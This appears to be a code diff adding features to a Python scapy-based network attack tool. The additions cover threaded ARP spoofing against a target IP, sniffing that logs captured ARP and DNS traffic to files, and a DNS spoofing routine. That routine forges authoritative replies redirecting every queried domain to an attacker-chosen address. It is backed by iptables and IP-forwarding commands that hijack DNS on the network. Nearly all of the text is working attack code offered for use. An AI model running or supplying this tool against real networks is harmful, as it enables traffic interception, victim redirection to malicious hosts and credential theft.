@@ -7,7 +7,14 @@ import scapy.all as scapy
 from scapy.all import conf, sniff, ARP, DNS, IP, UDP, DNSQR, DNSRR
 
 FAKE_IP = None
+arp_log = "arp_log.txt"
+dns_log = "dns_log.txt"
 
+def write_log(log, data):
+    """ Escribe los datos capturados en un archivo de log """
+    with open(log, "a") as file:
+        file.write(data + "\n")
+        
 def random_mac():
     """ Generate a random MAC address """
     return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
@@ -120,3 +127,53 @@ def restore_dns():
     """ Restore the iptables rules for DNS traffic redirection """
     os.system("sudo iptables -t nat -F")
     print("[+] DNS rules restored.")
+
+def arp_dns_sniffing(interface):
+    print(f"Iniciando captura de paquetes en {interface}... Presiona Ctrl + C para detener.")
+    try:
+        sniff(iface=interface, prn=process_packet, store=False)
+    except KeyboardInterrupt:
+        print(f"\n[!] Stop ARP and DNS Sniffing... Data stored in ", arp_log, "and", dns_log)
+
+def start_sniffing(interface, target_ip):
+    """ Starts an ARP Spoofing attack in a separate thread """
+    print(f"[+] Launching ARP and DNS Sniffing on {interface} against {target_ip}...")
+    threading.Thread(target=arp_dns_sniffing, args=(interface,)).start()
+
+def start_arp_spoofing(target_ip, gateway_ip, interface):
+    """ Starts an ARP Spoofing attack in a separate thread """
+    print(f"[+] Launching ARP Spoofing against {target_ip}...")
+    threading.Thread(target=arp_spoofing, args=(target_ip, gateway_ip, interface), daemon=True).start()
+
+def dns_spoofing(packet):
+    """ Escucha, intercepta y redirige las respuestas DNS a FAKE_IP """
+    if packet.haslayer(DNS) and packet.haslayer(IP) and packet[DNS].qr == 0:  # Request
+        print(f"[+] Spoofing DNS request {packet[DNSQR].qname.decode()} to {FAKE_IP}")
+
+        # Crea la respuesta falsa
+        spoofed_packet = (
+            IP(dst=packet[IP].src, src=packet[IP].dst) /
+            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
+            DNS(
+                id=packet[DNS].id,
+                qr=1,
+                aa=1,
+                qd=packet[DNS].qd,
+                an=DNSRR(rrname=packet[DNS].qd.qname, 
+                ttl=60, 
+                rdata=FAKE_IP)
+            )
+        )
+        scapy.send(spoofed_packet, verbose=0)
+        print(f"[+] Redirecting {packet[DNSQR].qname.decode()} to {FAKE_IP}.")
+
+def start_dns_spoofing(interface, target_ip, fake_ip):
+    """ Escucha tráfico DNS en la interfaz especificada """
+    print(f"[+] Launching DNS Spoofing against {target_ip}...")
+    global FAKE_IP
+    FAKE_IP = fake_ip
+    os.system(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system(f"sudo iptables -t nat -A POSTROUTING -o wlp3s0 -j MASQUERADE")
+    os.system(f"sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
+    os.system(f"sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
+    scapy.sniff(iface=interface, filter="udp port 53", prn=dns_spoofing, store=0)
